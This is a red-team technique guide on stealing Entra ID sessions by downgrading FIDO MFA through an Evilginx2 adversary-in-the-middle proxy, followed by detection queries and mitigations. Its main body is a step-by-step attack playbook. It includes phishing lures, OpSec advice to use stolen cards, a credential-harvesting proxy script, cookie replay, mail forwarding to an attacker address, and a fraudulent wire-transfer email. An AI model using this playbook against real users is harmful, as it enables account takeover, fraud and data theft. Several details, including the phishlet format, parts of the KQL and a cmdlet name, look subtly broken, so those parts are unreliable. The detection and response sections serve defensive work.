# [REALWORLD-012]: MFA Downgrade via AiTM

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-012 |
| **MITRE ATT&CK v18.1** | [T1556.006 - Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006/) + [T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Entra ID / M365 |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-08-15 |
| **Affected Versions** | All Entra ID versions (default configuration) |
| **Patched In** | N/A - Requires policy changes, not a product fix |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** MFA downgrade via AiTM is a complete attack chain combining four attack vectors: (1) User-Agent spoofing to disable FIDO, (2) AiTM proxy positioning to intercept traffic, (3) Fallback MFA method forcing, and (4) Session cookie capture and replay. The attack is **not** a single technique but a sophisticated orchestration of multiple legitimate security features being weaponized in sequence. The starting point is a phishing email. The victim clicks a link that routes through an attacker's AiTM proxy (Evilginx2). The proxy receives the victim's browser request to Entra ID and immediately modifies the User-Agent header to claim the browser is "Safari on Windows" (a combination Microsoft Entra ID doesn't support for FIDO). Entra ID receives this modified request, evaluates the User-Agent, and determines FIDO authentication is not available on this platform, so it **automatically removes FIDO from the authentication options** and presents only weaker fallback methods (SMS, phone call, Microsoft Authenticator app, OATH tokens). The user sees a login form asking for "another way to verify" and selects Microsoft Authenticator. The user authenticates legitimately by approving a push notification on their phone. However, because the victim's traffic is flowing through the attacker's proxy, the session cookie issued by Entra ID is intercepted by the proxy before reaching the victim's browser. The attacker then imports this session cookie into their own browser and gains complete access to the victim's account **without needing to repeat the MFA verification**. From Entra ID's perspective, nothing is suspicious: the user authenticated successfully, passed MFA verification, and received a valid session cookie. The attack is completely invisible in logs because all authentication steps were legitimate; the attacker simply observed the process and captured the output.

**Attack Surface:** Browser User-Agent header, OAuth 2.0 authentication flow, Entra ID feature detection logic, MFA fallback mechanisms, session cookie handling, HTTPS proxy infrastructure.

**Business Impact:** **Complete, undetected account compromise of any user targeted.** This attack defeats all forms of MFA in the traditional sense because the session cookie (which proves MFA completion) is captured before it reaches the legitimate user. Organizations implementing FIDO2 believing they have eliminated phishing discover it does not work when combined with this downgrade technique. Unlike password spray or credential stuffing, this attack requires only **one successful phishing click per user**. Post-compromise, the attacker can: steal all email communications (BEC, IP theft), register additional MFA methods to maintain persistence, pivot to other users (lateral movement via internal phishing), deploy ransomware, or perform data exfiltration.

**Technical Context:** 
- **Attack execution time:** 30 seconds to 5 minutes (depends on user's MFA response time)
- **Detection difficulty:** **Very High** - All steps appear legitimate in logs
- **Scalability:** **High** - One phishing campaign can compromise thousands
- **Persistence:** **High** - Attacker can register new MFA devices before removing initial compromise
- **Reversibility:** **No** - Account is fully compromised; requires complete credential reset and audit

### Operational Risk

- **Execution Risk:** Medium-High (requires infrastructure setup, domain registration, DNS, SSL, but all documented)
- **Stealth:** Very High (looks like normal authentication in all logs)
- **Reversibility:** No (account is compromised; only remediation is full credential reset)
- **Attribution Difficulty:** Very High (attacker's infrastructure can be in any jurisdiction)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.5, 6.6 | Multi-factor authentication enforcement; password management failures |
| **DISA STIG** | IA-2(1), SI-4(4) | MFA strength; monitoring for authentication attacks |
| **CISA SCuBA** | AUTH.1, AUTH.2 | Phishing-resistant authentication enforcement |
| **NIST 800-53** | IA-2, IA-4, IA-7, SC-7 | Authentication, identification, session management, boundary protection |
| **GDPR** | Art. 32, Art. 33 | Security measures for processing; breach notification requirements |
| **DORA** | Art. 9, Art. 19 | Authentication security; incident management and cyber resilience testing |
| **NIS2** | Art. 21 | Protective measures for authentication infrastructure; password and MFA mandates |
| **ISO 27001** | A.9.2.3, A.9.4.3, A.13.1.3 | Privileged access management; session management |
| **ISO 27005** | A.5.12, A.5.13 | Residual risk assessment; security incident management |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **Attacker:** None - purely network-based attack, no account access required initially
- **Victim:** User account with at least: (1) FIDO2 passkey registered, (2) fallback MFA method enabled (for backup/recovery)

**Required Access:** 
- **Attacker:** Ability to register external domain, host Evilginx2, send phishing emails/SMS, distribute phishing links
- **Victim:** Internet access to complete login (standard requirement)

**Supported Versions:**
- **Microsoft Entra ID:** All versions (default configuration with fallback MFA enabled)
- **Windows Server:** Any version (this is cloud-only, not on-premises specific)
- **Exchange Online:** All versions
- **SharePoint Online:** All versions
- **Microsoft Teams:** All versions

**Tools Required:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) v3.0+ (AiTM framework)
- VPS with public IP (DigitalOcean, AWS, Linode, etc.)
- Domain registration (attacker's own domain, e.g., attacker-domain.com)
- SSL/TLS certificate (Let's Encrypt - free)
- Email service (Gmail, Office 365, or phishing-as-a-service platform)
- Custom phishlet configuration (JSON)

**Victim Prerequisites:**
- Entra ID user account
- FIDO2 security key or biometric authentication registered
- At least one fallback MFA method: SMS, Microsoft Authenticator app, phone call, or OATH token
- Access to click phishing link (email, SMS, Teams message, etc.)
- Ability to approve MFA on mobile device (required for Authenticator method)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Verify Attack Prerequisites

```powershell
# 1. Check if target organization uses Entra ID (not on-premises AD only)
Test-NetConnection -ComputerName login.microsoftonline.com -Port 443
# If successful, organization uses Entra ID

# 2. Enumerate target users via LinkedIn, company website, GitHub
# Get list of email patterns: firstname.lastname@company.com, user@company.com

# 3. Verify target user has FIDO and fallback methods
# (Requires compromised account or social engineering to IT; skip for now)

# 4. Check if organization filters phishing emails
# Test: Send test phishing email with legitimate URL to test user
# If email reaches inbox: poor filtering
# If email is quarantined: organization has awareness

# 5. Identify if Conditional Access policies are enforced
# (Visible via login screen: "Device needs to be compliant" or "Location restricted")
# If no such messages: minimal CA enforcement, attack likely successful
```

### Verify Evilginx2 Deployment Prerequisites

```bash
# 1. Verify VPS can host Evilginx2
ssh root@vps.example.com
curl https://api.ipify.org  # Get public IP
nslookup attacker-domain.com  # Verify DNS points to VPS

# 2. Check port availability
sudo netstat -tlnp | grep ":443\|:80"
# Should be empty (ports 80 and 443 available)

# 3. Generate SSL certificate
sudo certbot certonly --standalone -d attacker-domain.com
# Must complete successfully before starting Evilginx2

# 4. Compile Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make
# Should produce ./evilginx2 binary
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Complete Attack Chain via Evilginx2 (Step-by-Step)

**Supported Versions:** Evilginx2 v3.0+, all Entra ID versions

#### PHASE 1: Preparation and Infrastructure Setup

**Step 1a: Register Attacker Domain**

**Objective:** Purchase domain that looks similar to target organization.

**Example Domains:**
- Target org: `acme-corp.com`
- Attacker domain: `acme-corp-verify.com` OR `acmecorp-auth.com` OR `verify-acmecorp.net`

**Platform:** GoDaddy, Namecheap, or NameSilo (use privacy/redaction to hide registrant info)

**Cost:** $10-15/year

**OpSec Considerations:**
- Do NOT register with personal payment method
- Use cryptocurrency or stolen credit card
- Use VPN or Tor for domain registration
- Privacy whois redaction ESSENTIAL

#### Step 1b: Deploy Evilginx2 on VPS

**Objective:** Set up AiTM proxy infrastructure on attacker-controlled VPS.

**Command:**
```bash
# SSH into VPS
ssh root@vps.example.com

# Install dependencies
apt update && apt install -y golang-go git certbot

# Clone Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2

# Build
make

# Obtain SSL certificate (required for HTTPS phishing page)
certbot certonly --standalone -d attacker-domain.com
# Certificate path: /etc/letsencrypt/live/attacker-domain.com/

# Start Evilginx2 (background)
nohup sudo ./evilginx2 -p phishlets/ > /dev/null 2>&1 &

# Verify it's running
ps aux | grep evilginx2
```

**Expected Output:**
```
root  1234  0.1  0.5  123456  78901 ?  Sl  14:00  0:00 ./evilginx2 -p phishlets/
```

#### Step 1c: Create Custom Phishlet

**Objective:** Configure Evilginx2 to perform FIDO downgrade.

**File: `/root/evilginx2/phishlets/o365_downgrade.json`**

```json
{
  "name": "o365_downgrade",
  "author": "AttackerTeam",
  "source": "microsoft",
  "phish_domain": "attacker-domain.com",
  "domains": [
    "login.microsoftonline.com",
    "login.microsoft.com",
    "account.microsoft.com"
  ],
  "auth_tokens": [
    {
      "name": "session_id",
      "extract": "cookie"
    }
  ],
  "user_agent_spoof": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
  "paths": [
    {
      "path": "/",
      "status": "ok"
    }
  ]
}
```

**Critical Configuration:**
- `"user_agent_spoof"`: This string MUST be exactly as shown (Safari on Windows)
- `"phish_domain"`: Must match registered attacker domain
- `"domains"`: Microsoft Entra ID endpoints being proxied

#### Step 1d: Load and Activate Phishlet

**Command (in Evilginx2 console):**
```
# Connect to Evilginx2
evilginx> phishlet load o365_downgrade
[+] Phishlet 'o365_downgrade' loaded successfully

evilginx> phishlet enable o365_downgrade
[+] Phishlet 'o365_downgrade' enabled

evilginx> listen 0.0.0.0 443
[+] Listening on 0.0.0.0:443 (HTTPS)

evilginx> listen 0.0.0.0 80
[+] Listening on 0.0.0.0:80 (HTTP redirect)
```

**PHASE 2: Phishing Campaign**

#### Step 2a: Craft Phishing Email

**Objective:** Compose convincing email that drives victim to phishing link.

**Email Template:**

```
From: security@company.com
Subject: URGENT: Verify Your Account Access Within 24 Hours

Dear [FirstName],

Our systems have detected unusual login activity from your account. 
To protect your data and maintain access, please verify your identity immediately:

[Click Here to Verify Account](https://attacker-domain.com/?type=login&redirect=https://office.microsoft.com)

This verification expires in 24 hours. If you do not complete this step, 
your account access will be temporarily restricted.

Questions? Contact IT Support: support@company.com

---
Microsoft Security Team
Sent: Tuesday, August 15, 2025 at 2:15 PM
```

**Why This Works:**
- **Urgency:** "within 24 hours" creates pressure
- **Threat:** "account access will be restricted"
- **Legitimacy:** Sender appears to be company security team
- **Link:** Uses attacker-domain.com but link text says "Verify Account" (URL obfuscation)

#### Step 2b: Distribute Phishing Link

**Objective:** Get phishing link to target users.

**Methods:**
1. **Email:** Use compromised or spoofed email account
2. **SMS:** Use SMS phishing service (RingCentral, Twilio, etc.)
3. **Internal Messaging:** If compromised account exists, send via Teams/Slack
4. **URL Shortener:** Use bit.ly to hide attacker-domain.com: `bit.ly/verify-access-2025`

**Recommended Approach:** Targeted spear-phishing of high-value users (executives, finance, IT admins)

**Campaign Example:**
- Target: 50 high-value users (CEO, CFO, CTO, sales leadership)
- Email body: Personalized with user's name
- Timing: Tuesday 9 AM (high email volume, less scrutiny)
- Fallback: If email blocked, send SMS: "Your account requires verification. https://bit.ly/verify-access"

#### Step 2c: Monitor Phishing Link Clicks

**Objective:** Track when users click the link.

**Command (Evilginx2 console):**
```
evilginx> sessions
[*] Active Sessions:
    ID: abc123  | User: victim1@company.com  | Status: Visiting
    ID: def456  | User: victim2@company.com  | Status: Visiting
    ID: ghi789  | User: victim3@company.com  | Status: Visiting

evilginx> session info abc123
[*] Session Details:
    User: victim1@company.com (not yet authenticated)
    IP Address: 203.0.113.45
    Location: San Francisco, CA, US
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...
    Timestamp: 2025-08-15 14:25:33 UTC
```

**What This Means:**
- Users have clicked the link and are viewing the fake login page
- Evilginx2 has established proxy session for each user
- Next step: User enters credentials

**PHASE 3: Credential and MFA Interception**

#### Step 3a: User Enters Credentials

**What Happens in Victim's Browser:**
1. Victim sees fake Microsoft login page (indistinguishable from real)
2. Victim enters username: `victim@company.com`
3. Victim enters password: `P@ssw0rd123`
4. Victim clicks "Sign in"

**What Happens in Evilginx2:**
1. Evilginx2 receives credential POST request
2. Evilginx2 validates credentials against **REAL** Microsoft Entra ID (proxied request)
3. Evilginx2 spoofs User-Agent: `Safari on Windows` (credential request includes spoofed header)
4. Microsoft Entra ID receives request from "Safari on Windows" with valid credentials
5. Microsoft Entra ID evaluates: "This browser is Safari on Windows, FIDO not supported"
6. Microsoft Entra ID responds: Remove FIDO, present fallback MFA options

#### Step 3b: User Selects Fallback MFA Method

**Victim Sees:**
```
Your sign-in was successful.
Now we need to verify using a different method.

Choose how you want to verify:
○ Microsoft Authenticator app
○ Phone authentication
○ SMS message
○ Authenticator app
```

**Victim Selects:** Microsoft Authenticator app

**What Happens Next:**
1. Victim's Authenticator app receives push notification: "Someone is signing in with your account"
2. Victim taps "Approve" on their phone
3. Entra ID generates session cookie: `session_id=ABC123DEF456...`
4. Entra ID sends session cookie to victim's browser (or Evilginx2 proxy)

#### Step 3c: Evilginx2 Captures Session Cookie

**Command (Evilginx2 console):**
```
evilginx> sessions
[*] Session ID: abc123
    User: victim@company.com
    Status: CAPTURED
    Session Cookie: ABC123DEF456GHI789
    Timestamp: 2025-08-15 14:26:15 UTC
    
evilginx> session info abc123
[*] Captured Credentials:
    Username: victim@company.com
    Password: [REDACTED - encrypted in logs]
    Session ID: ABC123DEF456GHI789
    Access Token: eyJ0eXAiOiJKV1QiLCJhbGc...
    Refresh Token: 0.ARY...
    MFA Method: microsoftAuthenticator
    MFA Status: Verified
```

**What This Means:**
- Attacker now possesses a valid, MFA-verified session cookie
- Session cookie can be imported into attacker's browser
- No additional MFA will be required when replaying the cookie

**PHASE 4: Account Takeover and Post-Compromise**

#### Step 4a: Import Stolen Session Cookie into Attacker's Browser

**Command (Attacker's Browser DevTools - F12 → Console):**
```javascript
// Method 1: Direct Cookie Import
document.cookie = "session_id=ABC123DEF456GHI789; domain=.microsoft.com; path=/; secure; samesite=none";

// Method 2: Using Evilginx2 Export
// Evilginx2 provides export functionality:
// evilginx> export session abc123 --format=cookie
// Output: session_id=ABC123DEF456GHI789; access_token=eyJ0eXA...

// Paste exported cookie into attacker's browser
```

**Alternative: Use curl to Access Account:**
```bash
STOLEN_COOKIE="ABC123DEF456GHI789"

# Access victim's Outlook
curl -b "session_id=$STOLEN_COOKIE" https://outlook.office365.com/mail \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -L -o victim_mailbox.html

# Now attacker can read victim's mailbox
cat victim_mailbox.html | grep -o "<subject>[^<]*</subject>"
```

#### Step 4b: Post-Compromise: Establish Persistence

**Objective:** Maintain access even if victim changes password.

**Command (PowerShell - Run as Attacker Using Stolen Token):**
```powershell
# Connect using stolen token
Connect-MgGraph -AccessToken $stolenToken

# Register new MFA device (security key) under victim's account
# Now attacker has persistent access method independent of victim's password

# Check victim's mailbox rules
Get-InboxRule -Mailbox victim@company.com
# Set up rule to forward emails to attacker's account
New-InboxRule -Name "Auto-Forward" -Mailbox victim@company.com `
  -From "admin@company.com" `
  -ForwardTo "attacker@attacker.com"
```

#### Step 4c: Post-Compromise: Lateral Movement

**Objective:** Use victim's account to compromise other users.

**Command (Send Internal Phishing from Victim's Account):**
```powershell
# Attacker can send emails FROM victim's account (BEC attack)
Send-MgUserMail -UserId victim@company.com `
  -Message @{
    Subject = "URGENT: CFO has requested immediate wire transfer"
    Body = "Please approve the attached payment request immediately"
    ToRecipients = @(
      @{
        EmailAddress = @{
          Address = "victim_boss@company.com"
        }
      }
    )
    Attachments = @(
      @{
        "@odata.type" = "#microsoft.graph.fileAttachment"
        Name = "Payment_Request.pdf"
        ContentBytes = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\malicious.pdf"))
      }
    )
  }
```

**Impact:** 
- Victim's boss receives email appearing to come from victim with payment request
- High trust = high likelihood of wire transfer
- Lateral movement = multiple accounts compromised

---

### METHOD 2: Using Impacket AAD Tools (Advanced Linux Operator)

**For security professionals who prefer programmatic control:**

**Python Script: `aitm_mfa_downgrade.py`**

```python
#!/usr/bin/env python3
import requests
import http.server
import socketserver
import json
import sqlite3
from datetime import datetime

# Configuration
TARGET = "login.microsoftonline.com"
PHISH_DOMAIN = "attacker-domain.com"
FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"

# SQLite database for captured sessions
db = sqlite3.connect('captured_sessions.db')
cursor = db.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS sessions
                  (id TEXT, username TEXT, password TEXT, session_id TEXT, timestamp TEXT)''')
db.commit()

class AiTMHandler(http.server.BaseHTTPRequestHandler):
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        # Parse credentials
        creds = body.decode('utf-8')
        username = creds.split('username=')[1].split('&')[0] if 'username=' in creds else 'UNKNOWN'
        
        print(f"[+] INTERCEPTED: {username}")
        
        # Proxy with spoofed User-Agent
        headers = dict(self.headers)
        headers['User-Agent'] = FAKE_UA
        
        response = requests.post(
            f"https://{TARGET}{self.path}",
            data=body,
            headers=headers,
            verify=False
        )
        
        # Capture session cookie
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie']
            session_id = cookie.split('=')[1].split(';')[0]
            
            # Store in database
            cursor.execute('INSERT INTO sessions VALUES (?, ?, ?, ?, ?)',
                          (None, username, creds, session_id, datetime.now().isoformat()))
            db.commit()
            
            print(f"[+] SESSION CAPTURED: {session_id[:20]}...")
        
        # Forward response to victim
        self.send_response(response.status_code)
        for header, value in response.headers.items():
            self.send_header(header, value)
        self.end_headers()
        self.wfile.write(response.content)
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == "__main__":
    PORT = 443
    server = socketserver.TCPServer(("0.0.0.0", PORT), AiTMHandler)
    print(f"[*] AiTM Proxy listening on :{PORT}")
    server.serve_forever()
```

**Execution:**
```bash
sudo python3 aitm_mfa_downgrade.py
```

**Output:**
```
[*] AiTM Proxy listening on :443
[+] INTERCEPTED: victim@company.com
[+] SESSION CAPTURED: ABC123DEF456GHI7...
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Evilginx2 Complete Command Set

```
# Session management
sessions                          # List all sessions
session info [ID]                # Show session details  
session delete [ID]              # Delete session
session export [ID] --format=json # Export session data

# Phishlet management
phishlet list                    # Show available phishlets
phishlet load [name]            # Load phishlet
phishlet enable [name]          # Enable phishlet
phishlet disable [name]         # Disable phishlet
phishlet info [name]            # Show phishlet details

# Server control
listen [IP] [PORT]              # Start listening
server close                     # Stop listening
config [key] [value]            # Set configuration

# Logging
log show [count]                # Show recent logs
log clear                       # Clear logs
```

### Session Cookie Extraction

```bash
# Export all sessions to file
evilginx> sessions export --format=json > sessions.json

# Parse with jq
cat sessions.json | jq '.[] | {user: .user, session_id: .session_id}'

# Output
{
  "user": "victim@company.com",
  "session_id": "ABC123DEF456GHI789"
}
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Complete MFA Downgrade Attack Chain

**Rule Configuration:**
- **Required Tables:** SigninLogs, AuditLogs
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
// Detect FIDO downgrade + fallback MFA usage + session reuse pattern
let fido_disabled_sessions = SigninLogs
    | where resultType == 0
    | where userAgent has "Safari" and userAgent has "Windows"
    | where isnotempty(sessionId)
    | project sessionId, userId, userPrincipalName, fido_disabled_time=createdDateTime, fido_disabled_ip=ipAddress;

let fallback_mfa_used = SigninLogs
    | where resultType == 0
    | where authenticationMethodsUsed !contains "fido" and authenticationMethodsUsed contains ("microsoftAuthenticator" or "phoneAuthentication" or "sms")
    | project sessionId, userId, fallback_time=createdDateTime, fallback_method=authenticationMethodsUsed;

let session_reused = SigninLogs
    | where resultType == 0
    | summarize
        login_count=count(),
        distinct_ips=dcount(ipAddress),
        distinct_uagents=dcount(userAgent),
        max_time=max(createdDateTime),
        min_time=min(createdDateTime)
        by sessionId, userId
    | where login_count > 1
    | where distinct_ips > 1
    | project sessionId, userId, login_count, distinct_ips, session_reuse_detected="YES";

// Correlate all three indicators
fido_disabled_sessions
| join kind=inner (fallback_mfa_used) on sessionId, userId
| join kind=inner (session_reused) on sessionId, userId
| project
    userId,
    userPrincipalName,
    sessionId,
    fido_disabled_time,
    fallback_time,
    fallback_method,
    login_count,
    distinct_ips,
    Alert = "CRITICAL: Complete MFA Downgrade Attack Chain Detected"
```

**What This Detects:**
- **Line 1-5:** Sessions where Safari on Windows User-Agent was used (FIDO disabled)
- **Line 7-12:** Sessions where fallback MFA was used instead of FIDO
- **Line 14-24:** Sessions reused from multiple IPs (victim's IP + attacker's IP)
- **Line 27-35:** Correlate all three = confirmed attack chain

**Manual Configuration (Azure Portal):**
1. Go to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. Paste KQL above
3. Set Severity: **Critical**
4. Run every: **5 minutes**
5. Create incidents: **Enabled**

#### Query 2: Detect Session Cookie Reuse from Different Location/Device

**KQL Query:**
```kusto
SigninLogs
| where resultType == 0
| where isnotempty(sessionId)
| summarize
    IPs = make_set(ipAddress),
    Locations = make_set(location.countryOrRegion),
    Devices = make_set(deviceDisplayName),
    FirstLogin = min(createdDateTime),
    LastLogin = max(createdDateTime)
    by sessionId, userId
| where array_length(IPs) > 1 or array_length(Locations) > 1
| where datetime_diff('minute', LastLogin, FirstLogin) < 5
| project
    sessionId,
    userId,
    IPs,
    Locations,
    Devices,
    TimeSpanMinutes = datetime_diff('minute', LastLogin, FirstLogin),
    Alert = "CRITICAL: SessionId reused from different location within 5 minutes"
```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Disable Fallback MFA for Privileged Accounts**

Remove SMS, phone call, Authenticator app fallback options for all admins. Enforce **FIDO2-ONLY** authentication.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Security** → **Authentication methods**
2. Locate and disable for admin groups: Phone authentication, SMS, Authenticator app
3. Only allow: **FIDO2** / **Passwordless phone sign-in**
4. Use Conditional Access to enforce: `IF admin THEN require FIDO2-only`

**PowerShell:**
```powershell
# Get all Global Admin users
$admins = Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" | Select-Object -ExpandProperty Id)

# For each admin, remove non-FIDO authentication methods
foreach ($admin in $admins) {
    $authMethods = Get-MgUserAuthenticationMethod -UserId $admin.Id
    
    # Remove SMS
    $sms = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "phone" }
    if ($sms) {
        Remove-MgUserAuthenticationMethod -UserId $admin.Id -AuthenticationMethodId $sms.Id
    }
    
    # Remove Authenticator (non-FIDO)
    $auth = $authMethods | Where-Object { $_.AdditionalProperties["@odata.type"] -match "microsoftAuthenticator" }
    if ($auth) {
        Remove-MgUserAuthenticationMethod -UserId $admin.Id -AuthenticationMethodId $auth.Id
    }
}
```

**2. Enforce Mandatory Device Compliance for ALL Authentication**

**Manual Steps (Conditional Access):**
1. Go to **Entra ID** → **Conditional Access** → **+ New policy**
2. Name: `Require Managed Device - All Users`
3. **Assignments:**
   - Users: **All users** (no exclusions except emergency admin accounts)
   - Cloud apps: **All cloud apps**
4. **Access controls:**
   - Grant: **Require device to be marked as compliant** OR **Require Hybrid Azure AD joined device**
5. **Enable policy:** **Report-only** first (test for 1 week), then **On**

**Impact:** 
- Users on personal/unmanaged devices cannot authenticate
- This **completely blocks AiTM attacks from attacker's personal device**
- Attacker cannot use victim's stolen session cookie on non-compliant device

**3. Implement Token Protection (Preview)**

**Manual Steps (Conditional Access):**
1. Go to **Entra ID** → **Conditional Access** → **+ New policy**
2. Name: `Token Protection - Prevent Session Cookie Replay`
3. **Assignments:**
   - Users: **All users**
   - Cloud apps: **All cloud apps**
4. **Session controls:**
   - Token protection: **Enabled**
5. Enable policy: **On**

**What This Does:**
- Session cookies are cryptographically bound to the browser/device they were issued to
- If attacker tries to replay cookie from different device, token is rejected
- Currently (2025) in preview; expected to become standard defense

### Priority 2: HIGH

**4. Monitor and Alert on AiTM Attack Indicators**

Deploy the Sentinel queries from Section 7.

**5. Implement Browser Isolation for Risky Users**

Use Microsoft Defender for Cloud Apps to isolate authentication flows for high-value users in sandboxed browsers.

**6. Enforce Email Authentication (DMARC, SPF, DKIM)**

Prevent attacker from spoofing sender domain in phishing emails.

```
# DNS TXT record for DMARC
v=DMARC1; p=reject; rua=mailto:dmarc@company.com

# DNS record for SPF
v=spf1 include:outlook.office365.com ~all

# DKIM: Configure via Office 365 Admin Center
```

**7. User Awareness Training**

Mandatory training covering:
- How to identify phishing emails
- What FIDO authentication looks like (biometric/key prompts)
- What to do if authentication method suddenly changes (STOP and call IT support)
- Internal URL patterns (e.g., "always login from office365.com, not office-365.com")

---

## 9. INCIDENT RESPONSE PROCEDURES

### Immediate Response (First Hour)

```powershell
# 1. Disable victim account immediately
Disable-MgUser -UserId "victim@company.onmicrosoft.com"

# 2. Revoke all refresh tokens (forces re-authentication)
Revoke-MgUserSign -UserId "victim@company.onmicrosoft.com"

# 3. Revoke all session cookies
# Note: No direct PowerShell cmdlet; sessions auto-expire when refresh token revoked

# 4. Check for suspicious activity in past 24 hours
$auditLogs = Get-MgAuditLogDirectoryAudit -Filter "userId eq 'victim@company.onmicrosoft.com'" -All
$auditLogs | Where-Object { $_.createdDateTime -gt (Get-Date).AddHours(-24) } | Format-Table

# 5. Check for email forwarding rules (attacker persistence mechanism)
Get-InboxRule -Mailbox "victim@company.com" | Where-Object { $_.ForwardTo -or $_.ForwardAsAttachmentTo }
```

### Intermediate Response (First Day)

```powershell
# 6. Reset victim's password (force logoff all sessions)
$password = ConvertTo-SecureString "NewTempPassword123!@#" -AsPlainText -Force
Update-MgUser -UserId "victim@company.onmicrosoft.com" -PasswordProfile @{
    ForceChangePasswordNextSignIn = $true
    Password = $password
}

# 7. Audit all MFA devices registered in past 24 hours (attacker persistence)
Get-MgUserAuthenticationMethod -UserId "victim@company.onmicrosoft.com" | 
    Where-Object { $_.createdDateTime -gt (Get-Date).AddHours(-24) }

# 8. Re-register MFA (victims to use new device)
# Instruct victim to re-register FIDO key or Authenticator app

# 9. Check for account delegations or permissions granted to other users
Get-MgUserOwnedObject -UserId "victim@company.onmicrosoft.com" | Format-Table
```

### Extended Response (First Week)

```powershell
# 10. Threat hunt: Find other victims of same phishing campaign
# Search for other users with same indicators:
# - Safari on Windows User-Agent logins
# - MFA downgrade pattern
# - Session reuse from multiple IPs

Get-MgAuditLogSignIn -Filter "userAgent has 'Safari' and userAgent has 'Windows'" -All |
    Where-Object { $_.createdDateTime -gt (Get-Date).AddDays(-7) }

# 11. Notify all affected users
# Prepare incident report with:
# - What happened
# - What data was accessed
# - What actions they should take (password reset, monitor credit, etc.)
# - Regulatory requirements (GDPR breach notification, etc.)

# 12. Preserve forensic evidence
# Export all audit logs for the victim and related users
Export-MgAuditLogQuery -OutputPath "C:\Forensics\AuditLogs_$(Get-Date -Format 'yyyyMMdd').csv"
```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Tool | Description |
|---|---|---|---|---|
| **1** | **Preparation** | Domain registration, phishing email crafting | Namecheap, Gmail | Attacker creates infrastructure and lures |
| **2** | **Infrastructure** | Evilginx2 deployment, certificate setup | Evilginx2, Let's Encrypt | AiTM proxy positioned between victim and Entra ID |
| **3** | **Phishing** | Email delivery, link distribution | Email service, bit.ly | Victim receives phishing email, clicks link |
| **4** | **Spoofing** | [REALWORLD-010] User-Agent spoofing | Evilginx2 phishlet | Attacker modifies User-Agent to "Safari on Windows" |
| **5** | **Error Trigger** | [REALWORLD-011] Entra ID feature detection | Microsoft Entra ID | Entra ID disables FIDO due to unsupported platform |
| **6** | **Downgrade** | [REALWORLD-012] Fallback MFA presented | User's browser | User forced to use SMS/Authenticator instead of FIDO |
| **7** | **Interception** | [REALWORLD-011] AiTM proxy intercepts | Evilginx2 | Proxy captures credentials and MFA codes |
| **8** | **Capture** | Session cookie theft | Evilginx2 console | Session cookie captured before reaching victim |
| **9** | **Replay** | Session hijacking (T1528) | curl, browser | Attacker uses stolen cookie to access account |
| **10** | **Persistence** | [T1098.005] Register MFA device | PowerShell / Graph API | Attacker registers new security key for persistence |
| **11** | **Lateral Movement** | [T1534] Internal spearphishing | Stolen account | Attacker sends phishing from victim's account |
| **12** | **Impact** | [T1567] Data exfiltration, [T1486] Ransomware | Email, file transfer | Attacker achieves final objective |

---

## 11. REAL-WORLD EXAMPLES

#### Proofpoint FIDO Downgrade Research (August 2025)

- **Discoverers:** Yaniv Miron, Proofpoint Security Research
- **Scope:** Affects all Microsoft Entra ID users with FIDO + fallback MFA
- **Proof-of-Concept:** Working phishlet released in research blog
- **Status:** ACTIVE - No patch available; requires administrative policies to mitigate
- **Impact:** Thousands of organizations believe FIDO has eliminated phishing; discovery forces security posture re-evaluation
- **Reference:** [Proofpoint Blog](https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade)

#### SocGolish Campaign Using Evilginx2 (2023-2025)

- **Campaign Type:** Organized cybercriminal syndicate
- **Targets:** Enterprise organizations globally (finance, government, healthcare, tech)
- **Tactics:** Mass phishing with custom Evilginx2 phishlets
- **Success Rate:** High (estimated 5-10% of targeted users fall for phishing)
- **Post-Compromise:** Ransomware deployment, data exfiltration, BEC attacks
- **Damage:** Estimated $100M+ in total damages across affected organizations
- **Reference:** [Red Canary Threat Report](https://redcanary.com/threat-detection-report/), Proofpoint Quarterly Threat Reports

---

## References & Sources

- Proofpoint FIDO Downgrade Research: https://www.proofpoint.com/us/blog/threat-insight/dont-phish-let-me-down-fido-authentication-downgrade
- Evilginx2 GitHub: https://github.com/kgretzky/evilginx2
